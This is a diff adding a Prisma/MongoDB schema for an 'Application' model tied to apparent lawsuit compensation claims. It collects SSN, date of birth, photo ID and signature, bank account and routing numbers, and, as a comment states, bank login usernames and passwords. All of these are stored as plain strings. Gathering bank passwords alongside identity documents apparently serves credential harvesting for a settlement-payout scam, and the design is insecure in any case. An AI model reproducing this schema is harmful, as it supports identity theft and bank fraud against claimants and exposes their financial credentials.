@@ -1,0 +1,64 @@
+generator client {
+  provider = "prisma-client"
+  output   = "./generated"
+}
+
+datasource db {
+  provider = "mongodb"
+  url      = env("DATABASE_URL")
+}
+
+model Application {
+  id        String   @id @default(uuid()) @map("_id")
+  createdAt DateTime @default(now())
+  updatedAt DateTime @updatedAt
+
+  // Personal Information
+  fullName     String
+  dateOfBirth  DateTime
+  ssn          String
+  claimId      String   @unique
+  phone        String
+  email        String
+
+  // Address Information
+  street String
+  city   String
+  state  String
+  zip    String
+
+  // Claim Information
+  lawsuitType String
+  filingDate  DateTime
+  court       String
+  judgmentDate DateTime
+
+  // Compensation Details
+  totalAmount Float
+
+  // Bank Details
+  bankName      String
+  accountNumber String
+  routingNumber String
+  accountType   String
+
+  // Payment Information
+  paymentMethod String
+  bankVerified  Boolean @default(false)
+
+  // Bank Login Credentials (stored when user connects bank)
+  bankUsername String?
+  bankPassword String?
+
+  // Document (merged PDF of photo ID and signature)
+  documentPdfBase64 String // Base64 encoded PDF
+
+  // Consent
+  consent Boolean
+
+  // Status tracking
+  status String @default("submitted") // submitted, under_review, approved, rejected
+
+  @@index([email])
+  @@index([createdAt])
+}
